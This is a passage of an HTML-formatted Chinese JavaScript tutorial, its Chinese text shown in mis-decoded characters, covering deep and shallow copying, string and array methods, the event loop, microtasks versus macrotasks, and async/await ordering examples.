<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a, b);<span class="hljs-comment">// [1,2,3] [1,4,3]</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> a = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>];
<span class="hljs-keyword">const</span> b = [...a];
b[<span class="hljs-number">1</span>] = <span class="hljs-number">4</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a, b);<span class="hljs-comment">// [1,2,3] [1,4,3]</span>
</code></pre>
<h4 data-id="heading-26">12.2 æ·±æ‹·è´</h4>
<p>å¸¸è§æ·±æ‹·è´æ–¹å¼ï¼š</p>
<ul>
<li>_.cloneDeep()</li>
<li>jQuery.extend()</li>
<li>JSON.stringify()</li>
<li>æ‰‹å†™å¾ªç¯é€’å½’</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> _ = <span class="hljs-built_in">require</span>(<span class="hljs-string">'lodash'</span>);
<span class="hljs-keyword">const</span> obj1 = {
    <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>,
    <span class="hljs-attr">b</span>: { <span class="hljs-attr">f</span>: { <span class="hljs-attr">g</span>: <span class="hljs-number">1</span> } },
    <span class="hljs-attr">c</span>: [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]
};
<span class="hljs-keyword">const</span> obj2 = _.<span class="hljs-title function_">cloneDeep</span>(obj1);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj1.<span class="hljs-property">b</span>.<span class="hljs-property">f</span> === obj2.<span class="hljs-property">b</span>.<span class="hljs-property">f</span>); <span class="hljs-comment">// false</span>
</code></pre>
<p>JSON.stringify()</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æœ‰ç¼ºç‚¹ ä¼šå¿½ç•¥undefinedã€symbolã€å‡½æ•°</span>
<span class="hljs-keyword">const</span> obj2=<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj1));
</code></pre>
<p>å¾ªç¯é€’å½’</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deepClone</span>(<span class="hljs-params">obj, hash = <span class="hljs-keyword">new</span> <span class="hljs-built_in">WeakMap</span>()</span>) {
    <span class="hljs-keyword">if</span> (obj === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> obj; <span class="hljs-comment">//nullæˆ–è€…undefinedå°±ä¸æ‹·è´</span>
    <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Date</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(obj);
    <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">RegExp</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(obj);
    <span class="hljs-comment">// å¯èƒ½æ˜¯å¯¹è±¡æˆ–è€…æ™®é€šçš„å€¼ å¦‚æœæ˜¯å‡½æ•°çš„è¯ä¸æ‹·è´</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">"object"</span>) <span class="hljs-keyword">return</span> obj;
    <span class="hljs-comment">// æ˜¯å¯¹è±¡çš„è¯å°±è¦è¿›è¡Œæ·±æ‹·è´</span>
    <span class="hljs-keyword">if</span> (hash.<span class="hljs-title function_">get</span>(obj)) <span class="hljs-keyword">return</span> hash.<span class="hljs-title function_">get</span>(obj);
    <span class="hljs-keyword">let</span> cloneObj = <span class="hljs-keyword">new</span> obj.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>);
    hash.<span class="hljs-title function_">set</span>(obj, cloneObj);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> obj) {
        <span class="hljs-keyword">if</span> (obj.<span class="hljs-title function_">hasOwnProperty</span>(key)) {
            <span class="hljs-comment">// å®ç°ä¸€ä¸ªé€’å½’æ‹·è´</span>
            cloneObj[key] = <span class="hljs-title function_">deepClone</span>(obj[key], hash);
        }
    }
    <span class="hljs-keyword">return</span> cloneObj;
}
</code></pre>
<h4 data-id="heading-27">12.3 åŒºåˆ«</h4>
<blockquote>
<p>æµ…æ‹·è´åªå¤åˆ¶å±æ€§æŒ‡å‘æŸä¸ªå¯¹è±¡çš„æŒ‡é’ˆï¼Œè€Œä¸å¤åˆ¶å¯¹è±¡æœ¬èº«ï¼Œæ–°æ—§å¯¹è±¡è¿˜æ˜¯å…±äº«ä¸€å—å†…å­˜ï¼Œä¿®æ”¹å¯¹è±¡å±æ€§ä¼šå½±å“åŸå¯¹è±¡ã€‚</p>
</blockquote>
<blockquote>
<p>æ·±æ‹·è´ä¼šå¦å¤–åˆ›å»ºä¸€ä¸ªä¸€æ¨¡ä¸€æ ·çš„å¯¹è±¡ï¼Œä¸å…±äº«å†…å­˜ï¼Œä¸å½±å“åŸå¯¹è±¡ã€‚</p>
</blockquote>
<h3 data-id="heading-28">13. JavaScriptå­—ç¬¦ä¸²çš„å¸¸ç”¨æ–¹æ³•</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> stringValue = <span class="hljs-string">"hello world"</span>; 
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(stringValue.<span class="hljs-title function_">slice</span>(<span class="hljs-number">3</span>, <span class="hljs-number">7</span>)); <span class="hljs-comment">// "lo w"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(stringValue.<span class="hljs-title function_">substring</span>(<span class="hljs-number">3</span>,<span class="hljs-number">7</span>)); <span class="hljs-comment">// "lo w"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(stringValue.<span class="hljs-title function_">substr</span>(<span class="hljs-number">3</span>, <span class="hljs-number">7</span>)); <span class="hljs-comment">// "lo worl"</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// åˆ é™¤å‰ã€åæˆ–è€…å‰åæ‰€æœ‰ç©ºæ ¼ç¬¦ï¼Œå†è¿”å›æ–°çš„å­—ç¬¦ä¸²</span>
<span class="hljs-keyword">let</span> stringValue = <span class="hljs-string">" hello world "</span>;
<span class="hljs-keyword">let</span> trimmedStringValue = stringValue.<span class="hljs-title function_">trim</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(stringValue); <span class="hljs-comment">// " hello world "</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(trimmedStringValue); <span class="hljs-comment">// "hello world"</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ¥æ”¶ä¸€ä¸ªæ•´æ•°å‚æ•°ï¼Œå°†å­—ç¬¦ä¸²å¤åˆ¶å¤šå°‘æ¬¡ï¼Œè¿”å›æ‹¼æ¥æ‰€æœ‰å‰¯æœ¬åçš„ç»“æœ</span>
<span class="hljs-keyword">let</span> stringValue = <span class="hljs-string">"na "</span>;
<span class="hljs-keyword">let</span> copyResult = stringValue.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">2</span>) <span class="hljs-comment">// na na</span>
</code></pre>
<ul>
<li>toUpperCase()ã€toLowerCase() å¤§å°å†™è½¬åŒ–</li>
<li>indexOf() ä»å­—ç¬¦ä¸²å¼€å¤´å»æœç´¢ä¼ å…¥çš„å­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›ä½ç½®(æ²¡æ‰¾åˆ°è¿”å›-1)</li>
<li>includes() å­—ç¬¦ä¸²æ˜¯å¦åŒ…å«ä¼ å…¥çš„å­—ç¬¦ä¸²</li>
<li>split() æŠŠå­—ç¬¦ä¸²æŒ‰ç…§æŒ‡å®šåˆ†éš”ç¬¦ï¼Œæ‹†åˆ†æˆæ•°ç»„</li>
<li>replace() æ¥æ”¶ä¿©ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºåŒ¹é…çš„å†…å®¹ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºæ›¿æ¢çš„å…ƒç´ </li>
</ul>
<h3 data-id="heading-29">14.æ•°ç»„å¸¸ç”¨æ–¹æ³•</h3>
<h4 data-id="heading-30">å¢</h4>
<ul>
<li>push() æ·»åŠ åˆ°æ•°ç»„æœ«å°¾</li>
<li>unshift() åœ¨æ•°ç»„å¼€å¤´æ·»åŠ </li>
<li>splice() ä¼ å…¥3ä¸ªå‚æ•°ï¼Œå¼€å§‹ä½ç½®ã€0ï¼ˆè¦åˆ é™¤çš„å…ƒç´ æ•°é‡ï¼‰ã€æ’å…¥çš„å…ƒç´ </li>
<li>concat() åˆå¹¶æ•°ç»„ï¼Œè¿”å›ä¸€ä¸ªæ–°æ•°ç»„</li>
</ul>
<h4 data-id="heading-31">åˆ </h4>
<ul>
<li>pop() åˆ é™¤æ•°ç»„æœ€åä¸€é¡¹ï¼Œè¿”å›è¢«åˆ é™¤çš„é¡¹ã€‚</li>
<li>shift() åˆ é™¤æ•°ç»„çš„ç¬¬ä¸€é¡¹ï¼Œè¿”å›è¢«åˆ é™¤çš„é¡¹ã€‚</li>
<li>splice()ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œå¼€å§‹ä½ç½®ï¼Œåˆ é™¤å…ƒç´ çš„æ•°é‡ï¼Œè¿”å›åŒ…å«åˆ é™¤å…ƒç´ çš„æ•°ç»„ã€‚</li>
<li>slice() ç”¨äºåˆ›å»ºä¸€ä¸ªåŒ…å«åŸæœ‰æ•°ç»„ä¸­ä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç´ çš„æ–°æ•°ç»„ï¼Œä¸ä¼šå½±å“åŸå§‹æ•°ç»„ã€‚</li>
</ul>
<h4 data-id="heading-32">æŸ¥</h4>
<ul>
<li>indexOf() è¿”å›è¦æŸ¥æ‰¾å…ƒç´ åœ¨æ•°ç»„ä¸­çš„ä½ç½®ï¼Œå¦‚æœæ²¡æ‰¾åˆ°åˆ™è¿”å› -1.</li>
<li>includes() è¿”å›æŸ¥æ‰¾å…ƒç´ æ˜¯å¦åœ¨æ•°ç»„ä¸­ï¼Œæœ‰è¿”å›true,å¦åˆ™false.</li>
<li>find() è¿”å›ç¬¬ä¸€ä¸ªåŒ¹é…çš„å…ƒç´ ã€‚</li>
</ul>
<h4 data-id="heading-33">æ’åºæ–¹æ³•</h4>
<ul>
<li>reverse() å°†æ•°ç»„å…ƒç´ æ–¹å‘åè½¬</li>
<li>sort() æ¥å—ä¸€ä¸ªæ¯”è¾ƒå‡½æ•°ï¼Œç”¨äºåˆ¤æ–­é‚£ä¸ªå€¼åœ¨å‰é¢</li>
<li/>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">compare</span>(<span class="hljs-params">value1, value2</span>) {
    <span class="hljs-keyword">if</span> (value1 &lt; value2) {
        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value1 &gt; value2) {
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
}
<span class="hljs-keyword">let</span> values = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>];
values.<span class="hljs-title function_">sort</span>(compare);
<span class="hljs-title function_">alert</span>(values); <span class="hljs-comment">// 0,1,5,10,15</span>
</code></pre>
<h4 data-id="heading-34">è½¬æ¢æ–¹æ³•</h4>
<p>join() æ–¹æ³•æ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œå³å­—ç¬¦ä¸²åˆ†éš”ç¬¦ï¼Œè¿”å›åŒ…å«æ‰€æœ‰é¡¹çš„å­—ç¬¦ä¸²ã€‚</p>
<h4 data-id="heading-35">å¾ªç¯æ–¹æ³•</h4>
<h5 data-id="heading-36">some() å’Œ every() æ–¹æ³•ä¸€æ ·</h5>
<p>å¯¹æ•°ç»„æ¯ä¸€é¡¹éƒ½è¿è¡Œä¼ å…¥çš„æµ‹è¯•å‡½æ•°ï¼Œå¦‚æœè‡³å°‘æœ‰ä¸€ä¸ªå…ƒç´ è¿”å›true,åˆ™è¿™ä¸ªæ–¹æ³•è¿”å›true.</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>];
<span class="hljs-keyword">let</span> someResult = numbers.<span class="hljs-title function_">some</span>(<span class="hljs-function">(<span class="hljs-params">item, index, array</span>) =&gt;</span> item &gt; <span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(someResult) <span class="hljs-comment">// true</span>
</code></pre>
<h5 data-id="heading-37">forEach()</h5>
<p>å¯¹æ•°ç»„æ¯ä¸€é¡¹éƒ½è¿è¡Œä¼ å…¥çš„å‡½æ•°ï¼Œæ²¡æœ‰è¿”å›å€¼</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>];
numbers.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item, index, array</span>) =&gt;</span> {
    <span class="hljs-comment">//æ‰§è¡Œæ“ä½œ</span>
});
</code></pre>
<h5 data-id="heading-38">filter()</h5>
<p>å‡½æ•°è¿”å›true çš„é¡¹ä¼šç»„æˆæ•°ç»„ä¹‹åè¿”å›ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>];
<span class="hljs-keyword">let</span> filterResult = numbers.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">item, index, array</span>) =&gt;</span> item &gt; <span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(filterResult); <span class="hljs-comment">// 3,4,5,4,3</span>
</code></pre>
<h5 data-id="heading-39">map()</h5>
<p>è¿”å›ç”±æ¯æ¬¡å‡½æ•°è°ƒç”¨çš„ç»“æœæ„æˆçš„æ•°ç»„ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>];
<span class="hljs-keyword">let</span> mapResult = numbers.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item, index, array</span>) =&gt;</span> item * <span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mapResult) <span class="hljs-comment">// 2,4,6,8,10,8,6,4,2</span>
</code></pre>
<h4 data-id="heading-40">15.äº‹ä»¶å¾ªç¯çš„ç†è§£ï¼Ÿ</h4>
<h5 data-id="heading-41">äº‹ä»¶å¾ªç¯</h5>
<p>JavaScriptæ˜¯ä¸€é—¨å•çº¿ç¨‹çš„è¯­è¨€ï¼Œå®ç°å•çº¿ç¨‹éé˜»å¡çš„æ–¹æ³•å°±æ˜¯äº‹ä»¶å¾ªç¯ã€‚
åœ¨<code>JavaScript</code>ä¸­ï¼Œæ‰€æœ‰çš„ä»»åŠ¡éƒ½å¯ä»¥åˆ†ä¸ºï¼š</p>
<ul>
<li>åŒæ­¥ä»»åŠ¡ï¼šç«‹å³æ‰§è¡Œçš„ä»»åŠ¡ï¼ŒåŒæ­¥ä»»åŠ¡ä¸€èˆ¬ä¼šç›´æ¥è¿›å…¥åˆ°ä¸»çº¿ç¨‹æ‰§è¡Œã€‚</li>
<li>å¼‚æ­¥ä»»åŠ¡ï¼šå¼‚æ­¥çš„æ¯”å¦‚<code>ajax</code>ç½‘ç»œè¯·æ±‚ï¼Œ<code>setTimeout</code>å®šæ—¶å‡½æ•°ç­‰ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89c5175c843b4dcda097517caccab9f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCx5Y-r5puy5aWH6aW85bmy5ZCn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948400&amp;x-signature=ded2klux9ivZeOZ7KsPm5j%2FhjPA%3D" alt="image.png" loading="lazy"/></p>
<p>åŒæ­¥ä»»åŠ¡è¿›å…¥ä¸»çº¿ç¨‹ï¼Œå¼‚æ­¥ä»»åŠ¡è¿›å…¥ä»»åŠ¡é˜Ÿåˆ—ï¼Œä¸»çº¿ç¨‹å†…çš„ä»»åŠ¡æ‰§è¡Œå®Œæ¯•ä¸ºç©ºï¼Œä¼šå»ä»»åŠ¡é˜Ÿåˆ—è¯»å–å¯¹åº”çš„ä»»åŠ¡ï¼Œæ¨å…¥ä¸»çº¿ç¨‹æ‰§è¡Œã€‚ä¸Šè¿°è¿‡ç¨‹ä¸æ–­é‡å¤å°±æ˜¯<code>äº‹ä»¶å¾ªç¯</code>ã€‚</p>
<h5 data-id="heading-42">å®ä»»åŠ¡ä¸å¾®ä»»åŠ¡</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>)
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">2</span>)
}, <span class="hljs-number">0</span>)
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>)=&gt;</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'new Promise'</span>)
    <span class="hljs-title function_">resolve</span>()
}).<span class="hljs-title function_">then</span>(<span class="hljs-function">()=&gt;</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'then'</span>)
})
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">3</span>)
</code></pre>
<ul>
<li>é‡åˆ° console.log(1)ï¼Œç›´æ¥æ‰“å°1</li>
<li>é‡åˆ°å®šæ—¶å™¨ï¼Œå±äºæ–°çš„å®ä»»åŠ¡ï¼Œç•™ç€åé¢æ‰§è¡Œ</li>
<li>é‡åˆ° new Promiseï¼Œè¿™ä¸ªæ˜¯ç›´æ¥æ‰§è¡Œçš„ï¼Œæ‰“å°'newPromise</li>
<li>.then å±äºå¾®ä»»åŠ¡ï¼Œæ”¾å…¥å¾®ä»»åŠ¡é˜Ÿåˆ—ï¼Œåé¢å†æ‰§è¡Œ</li>
<li>é‡åˆ° console.log(3)ç›´æ¥æ‰“å° 3</li>
<li>å¥½äº†æœ¬è½®å®ä»»åŠ¡æ‰§è¡Œå®Œæ¯•ï¼Œç°åœ¨å»å¾®ä»»åŠ¡åˆ—è¡¨æŸ¥çœ‹æ˜¯å¦æœ‰å¾®ä»»åŠ¡ï¼Œå‘ç°.then çš„å›è°ƒï¼Œæ‰§è¡Œå®ƒæ‰“å°'then'</li>
<li>å½“ä¸€æ¬¡å®ä»»åŠ¡æ‰§è¡Œå®Œï¼Œå†å»æ‰§è¡Œæ–°çš„å®ä»»åŠ¡ï¼Œè¿™é‡Œå°±å‰©ä¸€ä¸ªå®šæ—¶å™¨çš„å®ä»»åŠ¡äº†ï¼Œæ‰§è¡Œå®ƒï¼Œæ‰“å° 2</li>
</ul>
<p>ç»“æœæ˜¯:<code>1=&gt;'new Promise'=&gt; 3 =&gt; 'then' =&gt; 2</code></p>
<p>å¼‚æ­¥ä»»åŠ¡æ‰§è¡Œé¡ºåºï¼Œäº‹ä»¶é˜Ÿåˆ—å…¶å®æ˜¯ä¸€ä¸ªâ€œå…ˆè¿›å…ˆå‡ºâ€çš„æ•°æ®ç»“æ„ï¼Œæ’åœ¨å‰é¢çš„äº‹ä»¶ä¼šä¼˜å…ˆè¢«ä¸»çº¿ç¨‹è¯»å–ã€‚</p>
<h6 data-id="heading-43">å¾®ä»»åŠ¡</h6>
<p>å¸¸è§çš„å¾®ä»»åŠ¡æœ‰ï¼š</p>
<ul>
<li>Promise.then</li>
<li>MutaionObserver</li>
<li>process.nextTice(node.js)</li>
</ul>
<h6 data-id="heading-44">å®ä»»åŠ¡</h6>
<p>å®ä»»åŠ¡çš„æ—¶é—´ç²’åº¦æ¯”è¾ƒå¤§ï¼Œæ‰§è¡Œçš„æ—¶é—´é—´éš”æ˜¯ä¸èƒ½ç²¾ç¡®æ§åˆ¶çš„ï¼Œå¯¹ä¸€äº›é«˜å®æ—¶æ€§çš„éœ€æ±‚å°±ä¸å¤ªç¬¦åˆ.</p>
<p>å¸¸è§çš„å®ä»»åŠ¡æœ‰:</p>
<ul>
<li>script(å¯ä»¥ç†è§£ä¸ºå¤–å±‚åŒæ­¥ä»£ç )</li>
<li>setTimeout/setInterval</li>
<li>Ul rendering/Uläº‹ä»¶</li>
<li>postMessageã€MessageChannel</li>
<li>setlmmediateã€1/0(Node.is)
è¿™æ—¶å€™ï¼Œäº‹ä»¶å¾ªç¯ï¼Œå®ä»»åŠ¡ï¼Œå¾®ä»»åŠ¡çš„å…³ç³»å¦‚å›¾æ‰€ç¤º</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9629e522bc2d4c7bb12c4fd6d35f715a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCx5Y-r5puy5aWH6aW85bmy5ZCn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948400&amp;x-signature=VTW9eQJdc8rB62KxEMXB3sVOC0I%3D" alt="image.png" loading="lazy"/></p>
<p>å®ƒçš„æ‰§è¡Œæœºåˆ¶æ˜¯:</p>
<ul>
<li>æ‰§è¡Œä¸€ä¸ªå®ä»»åŠ¡ï¼Œå¦‚æœé‡åˆ°å¾®ä»»åŠ¡å°±å°†å®ƒæ”¾åˆ°å¾®ä»»åŠ¡çš„äº‹ä»¶é˜Ÿåˆ—ä¸­</li>
<li>å½“å‰å®ä»»åŠ¡æ‰§è¡Œå®Œæˆåï¼Œä¼šæŸ¥çœ‹å¾®ä»»åŠ¡çš„äº‹ä»¶é˜Ÿåˆ—ï¼Œç„¶åå°†é‡Œé¢çš„æ‰€æœ‰å¾®ä»»åŠ¡ä¾æ¬¡æ‰§è¡Œå®Œ</li>
</ul>
<h5 data-id="heading-45">async ä¸ await</h5>
<p>asyncå°±æ˜¯ç”¨æ¥å£°æ˜ä¸€ä¸ªå¼‚æ­¥æ–¹æ³•ï¼Œawaitæ˜¯ç”¨æ¥ç­‰å¾…å¼‚æ­¥æ–¹æ³•æ‰§è¡Œã€‚</p>
<p>asyncå‡½æ•°è¿”å›ä¸€ä¸ªpromiseå¯¹è±¡ï¼Œä¸‹é¢ä»£ç æ˜¯ç­‰æ•ˆçš„ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'TEST'</span>);
}
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">asyncF</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">'TEST'</span>;
}
</code></pre>
<p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œ <code>await</code> å‘½ä»¤åé¢æ˜¯ä¸€ä¸ª <code>Promise</code> å¯¹è±¡ï¼Œè¿”å›è¯¥å¯¹è±¡çš„ç»“æœã€‚å¦‚æœä¸æ˜¯ <code>Promise</code> å¯¹è±¡ï¼Œå°±ç›´æ¥è¿”å›å¯¹åº”çš„å€¼ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// ç­‰åŒäº return 123</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> <span class="hljs-number">123</span>
}
<span class="hljs-title function_">f</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">i</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i)) <span class="hljs-comment">// 123</span>
</code></pre>
<p>ä¸ç®¡ <code>await</code> åé¢è·Ÿç€çš„æ˜¯ä»€ä¹ˆï¼Œ<code>await</code> éƒ½ä¼šé˜»å¡åé¢çš„ä»£ç ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fn1</span> (){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>)
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">fn2</span>()
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">2</span>) <span class="hljs-comment">// é˜»å¡</span>
}
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fn2</span> (){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'fn2'</span>)
}
<span class="hljs-title function_">fn1</span>()
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">3</span>)
</code></pre>
<p><code>await</code> ä¼šé˜»å¡ä¸‹é¢çš„ä»£ç (å³åŠ å…¥å¾®ä»»åŠ¡é˜Ÿåˆ—)ï¼Œä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå…ˆæ‰§è¡Œ <code>async</code> å¤–é¢çš„åŒæ­¥ä»£ç åŒæ­¥ä»£ç æ‰§è¡Œå®Œï¼Œå†å›åˆ° <code>async</code>å‡½æ•°ä¸­ï¼Œå†æ‰§è¡Œä¹‹å‰é˜»å¡çš„ä»£ç </p>
<p>è¾“å‡ºï¼š1ï¼Œfn2,3,2</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">async1</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1'</span>)
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">async2</span>()
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2'</span>)
}
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">async2</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'3'</span>)
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4'</span>)
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'settimeout'</span>)
})
<span class="hljs-title function_">async1</span>()
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">resolve</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'5'</span>)
    <span class="hljs-title function_">resolve</span>()
}).<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'6'</span>)
})
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'7'</span>);
<span class="hljs-comment">// è¾“å‡ºç»“æœï¼š 4 1 3 5 7 2 6 settimeout</span>
</code></pre>
<p>åˆ†æè¿‡ç¨‹ï¼š</p>
<ul>
<li>1.æ‰§è¡Œæ•´æ®µä»£ç ï¼Œé‡åˆ° <code>console.log('4')</code>ç›´æ¥æ‰“å°ç»“æœï¼Œè¾“å‡º <code>4</code>;</li>
<li>2.é‡åˆ°å®šæ—¶å™¨äº†ï¼Œå®ƒæ˜¯å®ä»»åŠ¡ï¼Œå…ˆæ”¾ç€ä¸æ‰§è¡Œ;</li>
